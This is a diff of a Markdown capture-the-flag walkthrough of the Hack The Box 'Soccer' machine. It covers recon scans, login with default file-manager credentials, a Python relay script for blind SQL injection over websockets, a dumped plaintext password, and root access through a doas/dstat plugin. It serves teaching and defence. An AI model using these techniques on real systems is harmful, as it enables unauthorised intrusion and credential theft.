@@ -1,12 +1,21 @@
-# Soccer
+---
+title: "Soccer"
+date: 2023-06-08T18:00:00-00:00
+draft: false
+hideTitle: false
+Cover: /htb-info-cards/Soccer.png
+toc: true
+tags: ["RCE", "Default credentials", "Websockets"]
+categories: ["Walkthrough", "HTB", "Linux", "Easy"]
+---
 
 Linux, Easy, Released 2022-12-18
 
-![index page](index%20page.png)
+<!-- ![index page](index%20page.png) -->
 
 ## INTRODUCTION
 
-At first, the target seems like a half-built Apache server. After a little enumeration, it seems like a single server hosting four website templates: one for music, one for interior design, one for artwork, and one that is generally-applicable. 
+At first, the target seems like a half-built Apache server. After a little enumeration, it seems like a single server hosting four website templates: one for music, one for interior design, one for artwork, and one that is generally-applicable.
 
 > It's funny, but some of these seem like really nice templates.
 
@@ -15,18 +24,12 @@ The real action, as the name of the box suggests, is at the admin panel that man
 **Warning: This walkthrough contains many spoilers.**
 **No spoilers will be unexpected if you read the walkthrough sequentially.
 
-
-
-[TOC]
-
-
-
 ## RECON
 
 I followed my typical first steps. I set up a directory for the box, with a ``nmap`` subdirectory. Then set $RADDR to my target machine's IP, and scanned it with my typical nmap "init" scan:
 
 ```bash
-nmap -sV -sC -O -n -Pn -oA nmap/init-scan $RADDR 
+nmap -sV -sC -O -n -Pn -oA nmap/init-scan $RADDR
 ```
 
 > ##### My "init" nmap scan: explained
@@ -47,21 +50,21 @@ Host is up (0.17s latency).
 Not shown: 997 closed tcp ports (reset)
 PORT     STATE SERVICE         VERSION
 22/tcp   open  ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey: 
+| ssh-hostkey:
 |   3072 ad0d84a3fdcc98a478fef94915dae16d (RSA)
 |   256 dfd6a39f68269dfc7c6a0c29e961f00c (ECDSA)
 |_  256 5797565def793c2fcbdb35fff17c615c (ED25519)
 80/tcp   open  http            nginx 1.18.0 (Ubuntu)
 |_http-server-header: nginx/1.18.0 (Ubuntu)
 |_http-title: Did not follow redirect to http://soccer.htb/
-| http-methods: 
+| http-methods:
 |_  Supported Methods: GET HEAD POST OPTIONS
 9091/tcp open  xmltec-xmlmail?
-| fingerprint-strings: 
-|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, RPCCheck, SSLSessionReq, drda, informix: 
+| fingerprint-strings:
+|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, RPCCheck, SSLSessionReq, drda, informix:
 |     HTTP/1.1 400 Bad Request
 |     Connection: close
-|   GetRequest: 
+|   GetRequest:
 |     HTTP/1.1 404 Not Found
 |     Content-Security-Policy: default-src 'none'
 |     X-Content-Type-Options: nosniff
@@ -79,7 +82,7 @@ PORT     STATE SERVICE         VERSION
 |     <pre>Cannot GET /</pre>
 |     </body>
 |     </html>
-|   HTTPOptions: 
+|   HTTPOptions:
 |     HTTP/1.1 404 Not Found
 |     Content-Security-Policy: default-src 'none'
 |     X-Content-Type-Options: nosniff
@@ -97,7 +100,7 @@ PORT     STATE SERVICE         VERSION
 |     <pre>Cannot OPTIONS /</pre>
 |     </body>
 |     </html>
-|   RTSPRequest: 
+|   RTSPRequest:
 |     HTTP/1.1 404 Not Found
 |     Content-Security-Policy: default-src 'none'
 |     X-Content-Type-Options: nosniff
@@ -143,7 +146,7 @@ Results of the strategy will be summarized at the end of the section.
 
    > :point_up: I use ``tee`` instead of the append operator ``>>`` so that I don't accidentally blow away my ``/etc/hosts`` file with a typo of ``>`` when I meant to write ``>>``.
 
-   
+
 
 2. Download the source code & **extract all the links**.
 
@@ -153,7 +156,7 @@ Results of the strategy will be summarized at the end of the section.
    2. Use ``strings`` to extract all strings from the source code
    3. Use regex to parse all strings. I look for text following an ``href`` attribute and anything with ``http`` or ``https``
 
-   
+
 
 3. Perform **vhost enumeration** on the target.
 
@@ -161,7 +164,7 @@ Results of the strategy will be summarized at the end of the section.
    ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://10.10.10.68:80/ -H "Host: FUZZ.soccer.htb" -c -t 40 -timeout 4 -ic -ac -mc 200,204,301,307,401,403,405,500,404
    ```
 
-   
+
 
 4. Perform **subdomain enumeration** on the target.
 
@@ -169,7 +172,7 @@ Results of the strategy will be summarized at the end of the section.
    ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories-lowercase.txt -u http://FUZZ.soccer.htb -c -t 40 -timeout 4 -ic -ac
    ```
 
-   
+
 
 5. Perform **directory enumeration** on the target domain and any domains collected in steps (3) or (4).
 
@@ -177,13 +180,13 @@ Results of the strategy will be summarized at the end of the section.
    feroxbuster -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories-lowercase.txt -u http://soccer.htb -A -d 1 -t 100 -T 4 --burp --smart
    ```
 
-> - For vhost and subdomain enumeration, ANY RESULTS may be important. 
+> - For vhost and subdomain enumeration, ANY RESULTS may be important.
 > - For directory enumeration, there are many false-positives. READ THROUGH THE RESULTS MANUALLY and look for important results. I sometimes run this twice, filtering out the byte size for unimportant pages.
 
 6. Check each page for a ``form`` with a POST method, using the list of pages from directory enumeration. I use a handy tool called **Selenium Oxide**. Below is a snippet that shows how I do this:
 
    ```python
-   exploit = ExploitBuilder('http', addr, use_proxy=args.proxy) 
+   exploit = ExploitBuilder('http', addr, use_proxy=args.proxy)
    with open(f'./{dirname}/discovered_uris.txt', 'r') as f:
        for f_url in f:
            # Change subdomains
@@ -203,15 +206,15 @@ Results of the strategy will be summarized at the end of the section.
 
    > Note that this check could also be performed using regex, but regex parsing of HTML is really difficult and error-prone in my experience.
 
-   
 
-7. Do **banner-grabbing** on the target. 
+
+7. Do **banner-grabbing** on the target.
 
    ```bash
    whatweb $RADDR && curl -IL $RADDR
    ```
 
-   
+
 
 8. Check **Wappalyzer**, a tool used for identifying the underlying technologies of a website. I use the official **Wappalyzer** plugin for firefox.
 
@@ -253,7 +256,7 @@ Attempting to navigate to `/tiny/uploads` shows a standard nginx *403 Forbidden*
 
 ## FOOTHOLD
 
-On the `/tiny/tinyfilemanager.php` page, there is a link at the bottom: © [CCP Programmers](https://tinyfilemanager.github.io/) that leads to the github page of the Tiny File manager source code. Thankfully, there is some documentation regarding installation and configuration. 
+On the `/tiny/tinyfilemanager.php` page, there is a link at the bottom: © [CCP Programmers](https://tinyfilemanager.github.io/) that leads to the github page of the Tiny File manager source code. Thankfully, there is some documentation regarding installation and configuration.
 
 In the [Security and User Management](https://github.com/prasathmani/tinyfilemanager/wiki/Security-and-User-Management) section, the default credentials are shown:
 
@@ -342,7 +345,7 @@ So what can ``www-data`` do? Whenever I gain foothold on a new box, I like to ta
    id && cat /etc/passwd | grep $USER
    ```
 
-   
+
 
 2. Check if the user can sudo
 
@@ -350,7 +353,7 @@ So what can ``www-data`` do? Whenever I gain foothold on a new box, I like to ta
    sudo -l
    ```
 
-   
+
 
 3. Check locations that are writable by the user or its group
 
@@ -359,7 +362,7 @@ So what can ``www-data`` do? Whenever I gain foothold on a new box, I like to ta
    find / -group [groupname] 2>/dev/null
    ```
 
-   
+
 
 4. Does the user already have any useful tools?
 
@@ -367,7 +370,7 @@ So what can ``www-data`` do? Whenever I gain foothold on a new box, I like to ta
    which nc netcat socat python perl php
    ```
 
-   
+
 
 5. Check for any active and listening sockets
 
@@ -377,7 +380,7 @@ So what can ``www-data`` do? Whenever I gain foothold on a new box, I like to ta
 
    > :point_up: also try ``netstat -antp``
 
-   
+
 
 6. Does the user have anything in cron?
 
@@ -385,7 +388,7 @@ So what can ``www-data`` do? Whenever I gain foothold on a new box, I like to ta
    crontab -l
    ```
 
-   
+
 
 7. Does the system or root have anything in cron?
 
@@ -394,7 +397,7 @@ So what can ``www-data`` do? Whenever I gain foothold on a new box, I like to ta
    ls -laR /etc/cron*
    ```
 
-   
+
 
 8. Find any SUID or SGID executables that are accessible by the user
 
@@ -402,17 +405,17 @@ So what can ``www-data`` do? Whenever I gain foothold on a new box, I like to ta
    find / -type f \( -perm -4000 -o -perm -2000 \) -exec ls -l {} \; 2>/dev/null | grep -v '/proc'
    ```
 
-   
+
 
 9. Download the toolbox (not covered in-depth here).
 
-   > My toolbox includes **linpeas**, **linenum**, **pspy**, and **chisel**. 
+   > My toolbox includes **linpeas**, **linenum**, **pspy**, and **chisel**.
    >
-   > Since HTB boxes are not connected to the internet, I usually get my tools onto the target box by standing up a python webserver and using any available tool (nc, wget, or curl) to download the tools from my attacker machine onto the target box. I also use this webserver for moving exploit code from my attacker box onto the target. 
+   > Since HTB boxes are not connected to the internet, I usually get my tools onto the target box by standing up a python webserver and using any available tool (nc, wget, or curl) to download the tools from my attacker machine onto the target box. I also use this webserver for moving exploit code from my attacker box onto the target.
    >
    > I've prepared a small toolbox for myself, including a short index.html page, that is generally applicable for any CTF box. I suggest any reader of this walkthough does the same.
 
-   
+
 
 10. Run **pspy** and take a look at any running processes. Since **pspy** is closed with ``ctrl+c``, and your reverse shell may not be fully interactive, it is best to run this on a timeout:
 
@@ -420,7 +423,7 @@ So what can ``www-data`` do? Whenever I gain foothold on a new box, I like to ta
     timeout 5m ./pspy
     ```
 
-    
+
 
 11. Run pre-scripted enumeration tools, such as **LinEnum** or **linpeas**
 
@@ -438,8 +441,8 @@ I only did steps (1) through (5) and saved the rest for later. Notable results f
 - (4) revealed that `nc`, `netcat`, `perl`, and `php` are present.
 - (5) revealed a few unexpected things:
   ![netstat](netstat.png)
-  **SSH**, **HTTP** server, and that mysterious service on **9091** are all running, we knew that already. 
-  But there is also **3306 (MySQL)** and **33060** (an interface to MySQL using the 'x-protocol'). 
+  **SSH**, **HTTP** server, and that mysterious service on **9091** are all running, we knew that already.
+  But there is also **3306 (MySQL)** and **33060** (an interface to MySQL using the 'x-protocol').
   Additionally, something listening on **port 3000**: often a development copy of a webserver, in my experience.
 - (11) linpeas showed something interesting:
   ![player doas root](player%20doas%20root.png)
@@ -497,7 +500,7 @@ curl localhost:3000
 
 ### Port 9091
 
-I was curious about what was running on port 9091, so I tried connecting to it using `nc $RADDR 9091`. After making a request, it was clear that it was running http. 
+I was curious about what was running on port 9091, so I tried connecting to it using `nc $RADDR 9091`. After making a request, it was clear that it was running http.
 
 To investigate, I'll searching for any of the nginx directories:
 
@@ -523,7 +526,7 @@ find / -name nginx* -type d 2>/dev/null
 /etc/nginx
 ```
 
-Remembering that configuration files are usually stored in `/etc`, I'll look there first. 
+Remembering that configuration files are usually stored in `/etc`, I'll look there first.
 
 ![etc nginx](etc%20nginx.png)
 
@@ -537,7 +540,7 @@ default  soc-player.htb
 Well that's odd. `soc-player.htb` seems like it would be an alternate domain running on this box. I'll take a look at the configuration file:
 
 ```
-www-data@soccer:/etc/nginx/sites-enabled$ cat soc-player.htb 
+www-data@soccer:/etc/nginx/sites-enabled$ cat soc-player.htb
 server {
         listen 80;
         listen [::]:80;
@@ -554,7 +557,7 @@ server {
 }
 ```
 
-Well how about that... very interesting. It's the website running on port 3000! 
+Well how about that... very interesting. It's the website running on port 3000!
 
 Based on the **server_name** property, there should be a subdomain that didn't appear during my subdomain fuzzing: ``soc-player.soccer.htb``. I added this new subdomain to my ``/etc/hosts`` file and tried navigating to the website:
 
@@ -582,22 +585,22 @@ Forwarding this request resulted in a short message from ther server: "Ticket Do
 
 ![ticket does not exit](ticket%20does%20not%20exit.png)
 
-Worth noting that this is not the typical `x-www-form-urlencoded` form that we usually see. This one uses a websocket (with port 9091). See below for the source: 
+Worth noting that this is not the typical `x-www-form-urlencoded` form that we usually see. This one uses a websocket (with port 9091). See below for the source:
 
 ```javascript
 var ws = new WebSocket("ws://soc-player.soccer.htb:9091");
         window.onload = function () {
-        
+
         var btn = document.getElementById('btn');
         var input = document.getElementById('id');
-        
+
         ws.onopen = function (e) {
             console.log('connected to the server')
         }
         input.addEventListener('keypress', (e) => {
             keyOne(e)
         });
-        
+
         function keyOne(e) {
             e.stopPropagation();
             if (e.keyCode === 13) {
@@ -605,7 +608,7 @@ var ws = new WebSocket("ws://soc-player.soccer.htb:9091");
                 sendText();
             }
         }
-        
+
         function sendText() {
             var msg = input.value;
             if (msg.length > 0) {
@@ -616,11 +619,11 @@ var ws = new WebSocket("ws://soc-player.soccer.htb:9091");
             else append("????????")
         }
         }
-        
+
         ws.onmessage = function (e) {
         append(e.data)
         }
-        
+
         function append(msg) {
         let p = document.querySelector("p");
         // let randomColor = '#' + Math.floor(Math.random() * 16777215).toString(16);
@@ -641,7 +644,7 @@ I haven't ever had to pentest a websockets-based application before, so I read u
 
 Ok, that might prove to be useful later. Next I'll try the *vulnerability detection* module:
 
-Test for generic Cross-site WebSocket Hijacking (CSWSH): 
+Test for generic Cross-site WebSocket Hijacking (CSWSH):
 
 > The other three vulnerabilities that the tool tests for are DoS, so I'm not interested in them for this box
 
@@ -659,9 +662,9 @@ Test for generic Cross-site WebSocket Hijacking (CSWSH):
 
 Unfortunately, like other XSS-adjacent vulnerabilities, this is only useful if I'm attempting to steal data from another user's interaction with the server. And as far as I know, I'm the only user on this box right now :eyes:.
 
-This got me thinking about what kind of vulnerability I really needed to find... :thinking: Clearly this ticket ID is being checked against some database (probably the MySQL database identified earlier). Really, the best thing would be an SQL injection. I did some searching on SQL Injection against websockets, and found [this page talking about it](https://rayhan0x01.github.io/ctf/2021/04/02/blind-sqli-over-websocket-automation.html) in the context of CTFs. 
+This got me thinking about what kind of vulnerability I really needed to find... :thinking: Clearly this ticket ID is being checked against some database (probably the MySQL database identified earlier). Really, the best thing would be an SQL injection. I did some searching on SQL Injection against websockets, and found [this page talking about it](https://rayhan0x01.github.io/ctf/2021/04/02/blind-sqli-over-websocket-automation.html) in the context of CTFs.
 
-> :bulb: Note to self: 
+> :bulb: Note to self:
 > Could I eavesdrop on the connection from **9091** to MySQL on **3306** (or **33060**)?
 > If a new connection is formed for every DB transaction, might be able to grab the connection string that way. Since it's local, that communication is unlikely to be encrypted. I'll check this out later.
 
@@ -677,13 +680,13 @@ import sys
 def send_ws(payload, serveraddr, param_name):
 	ws_server = f'ws://{serveraddr}'
 	ws = create_connection(ws_server)
-	# If the server returns a response on connect, use below line	
+	# If the server returns a response on connect, use below line
 	#resp = ws.recv() # If server returns something like a token on connect you can find and extract from here
-	
+
 	# For our case, format the payload in JSON
 	message = unquote(payload).replace('"','\'') # replacing " with ' to avoid breaking JSON structure
 	data = '{"%s":"%s"}' % (param_name, message)
-	
+
 	print(f'Sending {data}')
 
 	ws.send(data)
@@ -704,7 +707,7 @@ def middleware_server(host_port, server_addr, parameter, content_type="text/plai
 				payload = urlparse(self.path).query.split('=',1)[1]
 			except IndexError:
 				payload = False
-				
+
 			if payload:
 				content = send_ws(payload, server_addr, parameter)
 			else:
@@ -817,7 +820,7 @@ Table: accounts
 +------+-------------------+----------------------+----------+
 ```
 
-Nice. Storing passwords in plaintext - always a smart move :wink: 
+Nice. Storing passwords in plaintext - always a smart move :wink:
 So we've obtained a new credential: **player** / **PlayerOftheMatch2022**
 
 Keeping credential re-use in mind, let's try logging into mysql locally using the above credential:
@@ -826,10 +829,10 @@ Keeping credential re-use in mind, let's try logging into mysql locally using th
 
 Success! Now that I'm not waiting hours for a time based blind SQL injection, I'll take a look at the rest of the database.
 
-> Result: aside from **soccer_db**, all tables were mysql system tables. 
+> Result: aside from **soccer_db**, all tables were mysql system tables.
 > There was no information of immediate importance.
 
-We already know that **SSH** is running on the box, so it makes sense to try the **player** credential there, too. 
+We already know that **SSH** is running on the box, so it makes sense to try the **player** credential there, too.
 
 :tada: Awesome! That credential was successful for **SSH**. We're now logged in as **player**:
 
@@ -856,7 +859,7 @@ Having just obtained access to a new user, I'll go through my usual [Linux footh
 
 I'm not familiar with **doas**, so I did some research on what it is and how it works.
 
-:heart_eyes: It's like `sudo` and `su` rolled together. Like a privilege escalation dream come true. It looks like I can use `doas` as `player` but only with ``/usr/bin/dstat``. I've also never used ``dstat``, but there was some useful [info on GTFObins](https://gtfobins.github.io/gtfobins/dstat/#shell) on how to make use of it. 
+:heart_eyes: It's like `sudo` and `su` rolled together. Like a privilege escalation dream come true. It looks like I can use `doas` as `player` but only with ``/usr/bin/dstat``. I've also never used ``dstat``, but there was some useful [info on GTFObins](https://gtfobins.github.io/gtfobins/dstat/#shell) on how to make use of it.
 
 Apparently `dstat` can be used for PE because it can load arbitrary python plugins. I'll follow the procedure on how to create a `dstat` "plugin" for privilege escalation:
 
@@ -906,15 +909,15 @@ Now just simply ``cat`` out the flag to finish the box.
   Keep an eye on your scanning tools, and if something seems wrong, **don't be afraid to revise your usual methods**.
 - RTFM. Developers can be a little overstretched, and it's natural for people to cut a few corners. When this happens while critical software is being installed/configured, **they may forget to disable default credentials**. The documentation for open source software can sometimes reveal these credentials.
 - In HTB, **cracking hashes is almost never the way**. If you are trying to crack a hash, and can't do the job with just *rockyou*, then you're probably on the wrong track.
-- When you reach new milestones in your entry into a system (foothold -> user flag, user -> privesc), remember to **review your notes**. 
-  In this box, when I got a shell as `player`, I already knew the trick that I was going to use for privilege escalation (`doas` + `dstat`). 
+- When you reach new milestones in your entry into a system (foothold -> user flag, user -> privesc), remember to **review your notes**.
+  In this box, when I got a shell as `player`, I already knew the trick that I was going to use for privilege escalation (`doas` + `dstat`).
 
 ### Defender
 
 - As a developer, you must **clean up after yourself**. I'm not sure if http://soc-player.soccer.htb/ was under development and http://soccer.htb/ was in production, but there is no reason to have both running concurrently.
 - **Security by obscurity is never the answer**. Having a subdomain like http://soc-player.soccer.htb/ slows down an attacker, but any attacker with good enumeration skills will easily find this type of thing.
 - **Never store passwords in plaintext**. Does this even need explanation? Better yet, try externalizing the risk by using some kind of SSO service.
-- **Avoid granting unnecessary permissions**. There is no reason that `player` needed to be able to `dstat` as root. 
+- **Avoid granting unnecessary permissions**. There is no reason that `player` needed to be able to `dstat` as root.
 
 
 
@@ -922,6 +925,5 @@ Now just simply ``cat`` out the flag to finish the box.
 
 Thanks for reading
 
-🤝 🤝 🤝 🤝 
+🤝 🤝 🤝 🤝
 @4wayhandshake
-
